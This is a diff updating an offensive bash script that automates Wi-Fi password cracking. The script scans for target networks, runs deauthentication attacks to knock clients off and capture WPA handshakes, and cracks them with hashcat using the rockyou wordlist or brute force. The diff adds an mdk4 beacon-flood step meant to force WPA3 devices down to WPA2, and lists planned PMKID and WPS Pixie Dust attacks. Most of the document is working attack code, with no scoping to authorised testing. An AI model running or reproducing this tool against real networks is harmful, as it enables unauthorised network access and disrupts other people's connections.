@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# version: 3.4.3 26/1/25 04:44
+# version: 3.5 27/1/25 02:20
 
 
 ### FIX ###
@@ -13,7 +13,10 @@
 # specific passwords lists for different vendors
 # functions to crack PMKID (using hcxpcapngtool..)
 # default vendors length (for example: ZTE - 8 capital and numbers) with hashcat
-# find attacks for WPA2-WPA3, WPA3
+# find attacks for WPA3
+# Add clients untill we choose network.
+# Show WPS routers - and add Pixydust attack.
+
 
 
 # Start the script while connected to internet in order to download rockyou wordlist if not exist in it's path And OUI file for vendors name of devices and routers (will help identify farther attacks).
@@ -64,7 +67,7 @@ sudo chown -R $UN:$UN $targets_path
 # Dependencies Installation
 # ------------------------------
 function install_dependencies() {
-    packages=("aircrack-ng" "gnome-terminal" "wget" "hashcat" "hcxtools" "gawk" "dbus-x11")
+    packages=("aircrack-ng" "gnome-terminal" "wget" "hashcat" "hcxtools" "mdk4" "gawk" "dbus-x11")
     for package in "${packages[@]}"; do
         if ! dpkg -l | grep -q "^ii  $package "; then
             echo -e "\nUpdating the repositories.."
@@ -326,10 +329,10 @@ function choose_network() {
             echo -e "\033[1mThe Network is open.\033[0m"
             echo -e "Choose different Network.\n"
             continue  
-        elif [[ "$encryption" == *WPA3* ]]; then
+        elif [[ "$encryption" == "WPA3" ]]; then
             echo -e "\033[1mThe encryption is "$encryption". This script can't crack it yet.\033[0m"
             echo -e "Choose different Network.\n"
-            continue 
+            continue            
         fi
 
         # Check if we already have the Wi-Fi password for this BSSID
@@ -346,7 +349,6 @@ function choose_network() {
             echo -e "\033[1;34mPassword for $bssid_name (BSSID: $bssid_address)\033[0m was already checked and \033[1;31mnot found in Rockyou wordlist.\033[0m\n" 
             echo -e "Choose different Attack..\n"
             choose_password_attack
-            #continue 
         fi
 
         # If we only captured the handshake from previous scan
@@ -487,12 +489,24 @@ function devices_scanner() {
 }
 
 
+
+# ------------------------------
+# Router with Mixed Encryption
+# ------------------------------
+function mixed_encryption() {
+    echo -e "\033[1mThe encryption is "$encryption". \nThe devices may be using WPA3, we will try to trick them to switch to WPA2 so we could crack the password.\033[0m\n"
+    gnome-terminal --geometry=70x3-10000-10000 -- sudo timeout 95s mdk4 $wifi_adapter"mon" b -n $bssid_name_original -c $channel -w a
+    sleep 5
+}
+
+
+
 # ------------------------------
 # Deauth Attack  
 # ------------------------------
 function deauth_attack() {
 	    echo -e "\033[1;31m\033[1mStarting deauth attack ->>\033[0m"
-	    # trying 10 times (1 minutes) the deauth attack
+	    # trying 10 times (1.5 minutes) the deauth attack
 	    counter=10
 	    for ((i=1; i<=$counter; i++)); do        
 		target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")		
@@ -543,11 +557,9 @@ function deauth_attack() {
 # Dictionary Attack
 # -------------------------
 function dictionary_attack() {
-
-    hcxpcapngtool -o "$targets_path/$bssid_name/hash.hc22000" "$targets_path/$bssid_name/$bssid_name-01.cap" > /dev/null 2>&1
 	
     echo -e "\e[1m\nCracking wifi password with rockyou wordlist ->>\n\e[0m"
-    gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c "hashcat -m 22000 -a 0 "$targets_path/$bssid_name/hash.hc22000" $rockyou_file --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable"
+    gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c "hashcat -m 22000 -a 0 "$targets_path/$bssid_name/hash.hc22000" $rockyou_file --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable; sleep 5"
 
     echo
     if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
@@ -581,7 +593,7 @@ function dictionary_attack() {
 # Brute-Force attack
 # ------------------------------
 function brute-force_attack() {
-    hcxpcapngtool -o "$targets_path/$bssid_name/hash.hc22000" "$targets_path/$bssid_name/$bssid_name-01.cap" > /dev/null 2>&1
+    
     echo -e "\e[1m\nCracking WiFi password with Hashcat ->>\e[0m\n"
 
     # Ask user for password length
@@ -874,8 +886,22 @@ function main_process() {
 	adapter_config
 	network_scanner
 	devices_scanner
+	
+	if [[ "$encryption" == "WPA3 WPA2" ]]; then            
+            mixed_encryption
+        fi    
+
 	deauth_attack
 	cleanup
+	
+	hcxpcapngtool -o "$targets_path/$bssid_name/hash.hc22000" "$targets_path/$bssid_name/$bssid_name-01.cap" > /dev/null 2>&1
+	if [ ! -f "$targets_path/$bssid_name/hash.hc22000" ]; then
+	    echo '❌ Failed to create hash.hc22000 for hashcat.';
+	    echo 'Check if you captured the EAPOL handshake or PMKID.';
+	    echo -e 'Look at the airodump_output.txt file for details. \nExiting.\n\n';
+	    exit 1	       
+	fi	
+	
 	choose_password_attack
 }
 
